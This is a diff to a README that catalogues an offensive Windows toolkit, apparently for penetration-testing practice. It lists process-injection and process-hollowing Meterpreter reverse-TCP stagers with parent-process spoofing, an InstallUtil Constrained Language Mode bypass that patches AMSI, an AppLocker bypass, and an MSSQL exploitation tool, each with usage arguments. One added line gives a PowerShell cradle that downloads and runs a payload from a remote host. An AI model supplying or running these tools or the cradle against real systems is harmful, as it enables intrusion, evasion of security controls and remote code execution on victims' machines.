@@ -18,11 +18,15 @@ clinject - C# project source code for (IP + port + process) cli passed process i
 
 clhollow - C# project source code for (IP + port + PPID + process) cli passed process hollowing payload.
 
+bypass-clm - C# project source code for InstallUtil bypass for executing powershell commands via cli.  Contains AMSI patch
+
 sql - C# project source code for SQL.exe project for exploitation of MSSQL servers in AD.
 
 x64_met_staged_reversetcp_inject.exe - Command line args: IP PORT PROCESS_TO_INJECT(explorer)
 
 x64_met_staged_reversetcp_hollow.exe - Command line args: IP PORT PROCESS_TO_HOLLOW(c:\\windows\\system32\\svchost.exe) PPID_SPOOF(explorer) 
+
+bypass-clm.exe - For use with InstallUtil. Contains AMSI binary patch. Pass powershell commands with /c= e.g. /c="iex (new-object net.webclient).downloadstring('http://192.168.49.68/payload.txt')"
 
 sql.exe - x64 application for exploitation of linked SQL servers.  Has functionality for use with InstallUtil AppLocker bypass.
 
